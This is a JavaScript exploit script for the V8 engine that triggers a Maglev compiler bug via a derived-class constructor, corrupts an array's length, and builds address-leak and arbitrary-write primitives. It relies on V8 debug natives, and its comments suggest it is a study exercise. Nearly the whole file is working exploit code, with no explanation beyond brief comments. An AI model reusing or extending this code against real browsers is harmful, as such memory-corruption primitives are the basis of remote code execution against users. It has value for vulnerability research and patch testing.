class Helpers {
    constructor () {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    nop_nop() {

    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f) {
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }

        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }

        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}
var helper = new Helpers();

var v;
var empty_object = {};
let zero = 0;
let corrupted_instance = null;

let rwarr = null;
let rwarr_addr = 0
let a_addr = 0
let marker42_idx = 0;

class A { }
class B extends A {
    constructor () {
        v = new.target;
        let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();
        gc();
        let floatArr = [1.1];

        this.x = objArr;
        this.a = floatArr;
    }
}

function gc() {
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function debug_print(name, obj) {
    console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function trigger_bug() {
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    corrupted_instance.x[5] = 0x10000; // QUESTION: why can not corrupt outside this function
}

function addrof_tmp(obj) {
    corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
    helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
    return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

// These functions use `where-in` because v8
// needs to jump over the map and size words
function v8h_write64(where, what) {
    helper.f64[0] = corrupted_instance.a[marker42_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[marker42_idx - 1];
        helper.u32[1] = where - 8; // don't know why -8
        corrupted_instance.a[marker42_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[marker42_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}

function exploit() {
    print("[+] Triggering the bug...");
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
    // debug_print('corrupted_instance.x', corrupted_instance.x);
    // debug_print('corrupted_instance.a', corrupted_instance.a);

    // let objectThatNeedToBeLeaked = { a: 1 };
    // debug_print(objectThatNeedToBeLeaked);
    // print("[+] Leaking the object address...");
    // let leakedObjectAddress = addrof_tmp(objectThatNeedToBeLeaked);
    // print("[+] Leaked object address: 0x" + leakedObjectAddress.toString(16));

    print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
    corrupted_instance.x[5] = 0x10000000; // need to be bigger for covering the whole memory
    if (corrupted_instance.a.length != 0x10000000) {
        print(`[+] Initial corruption failed! Expected: ${0x10000000}, got: ${corrupted_instance.a.length}`);
        return;
    } else {
        print(`[+] Initial corruption succeeded!`);
        // debug_print('corrupted_instance.x', corrupted_instance.x);
        // debug_print('corrupted_instance.a', corrupted_instance.a);
    }

    print("[+] Perfoming read and write out of bounds...");
    while (true) {
        rwarr = [1.1, 2.2, 3.3];
        rwarr_addr = addrof_tmp(rwarr);
        a_addr = addrof_tmp(corrupted_instance.a);

        if (rwarr_addr < a_addr) {
            // print("[+] Target array does not lie after corrupted array. Retrying...");
        } else {
            // print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
            // print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
            // debug_print(`corrupted_instance.a`, corrupted_instance.a);
            // debug_print(`rwarr`, rwarr);

            print("[+] Calculating the offset...");
            let offset = (rwarr_addr - a_addr) + 0xc;
            if ((offset % 8) != 0) {
                offset -= 4;
            }
            print("[+] Offset: " + offset);

            print("[+] Calculating the index...");
            marker42_idx = offset / 8;
            marker42_idx += 1;
            print("[+] Index: " + marker42_idx);

            helper.f64[0] = corrupted_instance.a[marker42_idx];
            print("[+] The approximately view of pointer's data: 0x"
                + helper.u32[0].toString(16) + " 0x"
                + helper.u32[1].toString(16)); // value can be in u32[0] or u32[1]
            break;
        }
    }

    print("[+] Writing data...");
    let data = 13.37;                                    // have to be float because rwarr is a float array
    let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
    let bufToBeWritten_addr = addrof_tmp(bufToBeWritten);
    v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length
    debug_print('bufToBeWritten', bufToBeWritten);
}

exploit();








